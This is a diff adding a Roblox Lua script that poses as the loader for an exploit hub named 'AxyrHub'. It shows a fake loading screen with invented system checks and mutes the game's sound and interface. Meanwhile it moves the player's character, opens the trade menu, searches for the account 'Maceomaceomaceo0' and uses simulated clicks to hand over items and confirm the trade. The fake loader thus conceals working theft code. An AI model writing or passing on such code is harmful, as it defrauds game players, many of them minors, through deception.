@@ -1,0 +1,279 @@
+local player = game.Players.LocalPlayer
+local VIM = game:GetService("VirtualInputManager")
+local StarterGui = game:GetService("StarterGui")
+
+task.spawn(function()
+    for _, sound in ipairs(game:GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound:Stop()
+            sound.Volume = 0
+        end
+    end
+    game:GetService("SoundService").AmbientReverb = Enum.ReverbType.NoReverb
+end)
+
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingGui"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 999
+screenGui.Parent = player.PlayerGui
+
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bg.BackgroundTransparency = 0
+bg.BorderSizePixel = 0
+bg.ZIndex = 1
+bg.Parent = screenGui
+
+local logo = Instance.new("ImageLabel")
+logo.Size = UDim2.new(0, 60, 0, 60)
+logo.Position = UDim2.new(0.5, -210, 0.19, 0)
+logo.BackgroundTransparency = 1
+logo.Image = "rbxassetid://2152956"
+logo.ZIndex = 10
+logo.Parent = screenGui
+
+local hubTitle = Instance.new("TextLabel")
+hubTitle.Size = UDim2.new(0, 150, 0, 60)
+hubTitle.Position = UDim2.new(0.5, -140, 0.19, 0)
+hubTitle.BackgroundTransparency = 1
+hubTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+hubTitle.TextSize = 28
+hubTitle.Font = Enum.Font.GothamBold
+hubTitle.Text = "AxyrHub"
+hubTitle.TextXAlignment = Enum.TextXAlignment.Left
+hubTitle.ZIndex = 10
+hubTitle.Parent = screenGui
+
+local logo2 = Instance.new("ImageLabel")
+logo2.Size = UDim2.new(0, 60, 0, 60)
+logo2.Position = UDim2.new(0.5, 20, 0.19, 0)
+logo2.BackgroundTransparency = 1
+logo2.Image = "rbxassetid://5693189979"
+logo2.ZIndex = 10
+logo2.Parent = screenGui
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(0, 600, 0, 40)
+title.Position = UDim2.new(0.5, -300, 0.35, 0)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 22
+title.Font = Enum.Font.GothamBold
+title.Text = "Initializing..."
+title.ZIndex = 10
+title.Parent = screenGui
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(0, 600, 0, 25)
+statusLabel.Position = UDim2.new(0.5, -300, 0.42, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+statusLabel.TextSize = 13
+statusLabel.Font = Enum.Font.Code
+statusLabel.Text = "> Checking system requirements..."
+statusLabel.TextXAlignment = Enum.TextXAlignment.Left
+statusLabel.ZIndex = 10
+statusLabel.Parent = screenGui
+
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0, 500, 0, 16)
+barBg.Position = UDim2.new(0.5, -250, 0.52, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+barBg.BorderSizePixel = 0
+barBg.ZIndex = 10
+barBg.Parent = screenGui
+
+local corner1 = Instance.new("UICorner")
+corner1.CornerRadius = UDim.new(0, 8)
+corner1.Parent = barBg
+
+local bar = Instance.new("Frame")
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(0, 210, 100)
+bar.BorderSizePixel = 0
+bar.ZIndex = 11
+bar.Parent = barBg
+
+local corner2 = Instance.new("UICorner")
+corner2.CornerRadius = UDim.new(0, 8)
+corner2.Parent = bar
+
+local percent = Instance.new("TextLabel")
+percent.Size = UDim2.new(0, 500, 0, 25)
+percent.Position = UDim2.new(0.5, -250, 0.56, 0)
+percent.BackgroundTransparency = 1
+percent.TextColor3 = Color3.fromRGB(160, 160, 160)
+percent.TextSize = 12
+percent.Font = Enum.Font.Code
+percent.Text = "0% — Estimated time: 1:30"
+percent.TextXAlignment = Enum.TextXAlignment.Left
+percent.ZIndex = 10
+percent.Parent = screenGui
+
+local versionLabel = Instance.new("TextLabel")
+versionLabel.Size = UDim2.new(0, 500, 0, 20)
+versionLabel.Position = UDim2.new(0.5, -250, 0.62, 0)
+versionLabel.BackgroundTransparency = 1
+versionLabel.TextColor3 = Color3.fromRGB(60, 60, 60)
+versionLabel.TextSize = 11
+versionLabel.Font = Enum.Font.Code
+versionLabel.Text = "v2.4.1 — build 20240318"
+versionLabel.TextXAlignment = Enum.TextXAlignment.Left
+versionLabel.ZIndex = 10
+versionLabel.Parent = screenGui
+
+local messages = {
+    {0,   "> Checking system requirements..."},
+    {3,   "> DirectX 11 detected [OK]"},
+    {8,   "> Allocating memory blocks... 512MB reserved"},
+    {13,  "> Loading core modules [1/4]..."},
+    {18,  "> Loading core modules [2/4]..."},
+    {24,  "> Loading core modules [3/4]..."},
+    {30,  "> Loading core modules [4/4]... [OK]"},
+    {36,  "> Verifying file integrity... 2847 files checked"},
+    {42,  "> No corrupted files detected [OK]"},
+    {48,  "> Establishing secure connection..."},
+    {54,  "> Authentication successful [OK]"},
+    {60,  "> Syncing with remote server..."},
+    {67,  "> Download speed: 94.3 MB/s"},
+    {74,  "> Finalizing installation..."},
+    {82,  "> Cleaning temporary files..."},
+    {88,  "> System ready."},
+}
+
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+
+local targetPos = Vector3.new(-434.46, -7.00, 86.50)
+local distance = 3
+local done = false
+
+task.wait(0.1)
+humanoid.WalkSpeed = 50
+humanoid:MoveTo(targetPos)
+
+task.spawn(function()
+    while not done do
+        task.wait(7)
+        if not done then
+            humanoid:MoveTo(targetPos)
+        end
+    end
+end)
+
+local clicks = {
+    {464, 501},
+    {575, 463},
+    {825, 454},
+    {433, 631},
+    {626, 672},
+    {857, 680},
+    {474, 812},
+    {474, 812},
+    {855, 825},
+}
+
+task.spawn(function()
+    game:GetService("RunService").Heartbeat:Connect(function()
+        if done then return end
+
+        local dist = (rootPart.Position - targetPos).Magnitude
+        if dist <= distance then
+            done = true
+
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+            task.wait(0.2)
+
+            VIM:SendKeyEvent(true, Enum.KeyCode.E, false, game)
+            task.wait(0.1)
+            VIM:SendKeyEvent(false, Enum.KeyCode.E, false, game)
+
+            task.wait(0.1)
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+            task.wait(0.2)
+            VIM:SendMouseButtonEvent(1182, 313, 0, true, game, 0)
+            task.wait(0.1)
+            VIM:SendMouseButtonEvent(1182, 313, 0, false, game, 0)
+
+            task.wait(0.2)
+            VIM:SendMouseButtonEvent(949, 400, 0, true, game, 0)
+            task.wait(0.1)
+            VIM:SendMouseButtonEvent(949, 400, 0, false, game, 0)
+
+            task.wait(0.3)
+            local searchBox = player.PlayerGui.TradePlayerList.TradePlayerList.bg.SearchFrame.SearchBox
+            if searchBox then
+                searchBox:CaptureFocus()
+                task.wait(0.1)
+                searchBox.Text = "Maceomaceomaceo0"
+                task.wait(0.1)
+                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
+                task.wait(0.1)
+                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
+            end
+
+            task.wait(0.3)
+            VIM:SendMouseButtonEvent(1168, 494, 0, true, game, 0)
+            task.wait(0.1)
+            VIM:SendMouseButtonEvent(1168, 494, 0, false, game, 0)
+
+            task.wait(3)
+            for _, coord in ipairs(clicks) do
+                VIM:SendMouseButtonEvent(coord[1], coord[2], 0, true, game, 0)
+                task.wait(0.1)
+                VIM:SendMouseButtonEvent(coord[1], coord[2], 0, false, game, 0)
+                task.wait(1.3)
+            end
+
+            task.wait(5)
+            VIM:SendMouseButtonEvent(1112, 790, 0, true, game, 0)
+            task.wait(0.1)
+            VIM:SendMouseButtonEvent(1112, 790, 0, false, game, 0)
+
+            task.wait(15)
+            VIM:SendMouseButtonEvent(1112, 790, 0, true, game, 0)
+            task.wait(0.1)
+            VIM:SendMouseButtonEvent(1112, 790, 0, false, game, 0)
+
+            print("✅ Done !")
+        end
+    end)
+end)
+
+local duration = 90
+local elapsed = 0
+local step = 0.1
+local msgIndex = 1
+
+while elapsed < duration do
+    elapsed = elapsed + step
+    local ratio = elapsed / duration
+    bar.Size = UDim2.new(ratio, 0, 1, 0)
+
+    local remaining = duration - elapsed
+    local mins = math.floor(remaining / 60)
+    local secs = math.floor(remaining % 60)
+    percent.Text = string.format("%d%% — Estimated time: %d:%02d", math.floor(ratio * 100), mins, secs)
+
+    if msgIndex <= #messages and elapsed >= messages[msgIndex][1] then
+        statusLabel.Text = messages[msgIndex][2]
+        msgIndex = msgIndex + 1
+    end
+
+    task.wait(step)
+end
+
+title.Text = "Script loaded successfully."
+statusLabel.Text = "> All modules active. Running."
+percent.Text = "100% — Ready"
+task.wait(1.5)
+
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+screenGui:Destroy()
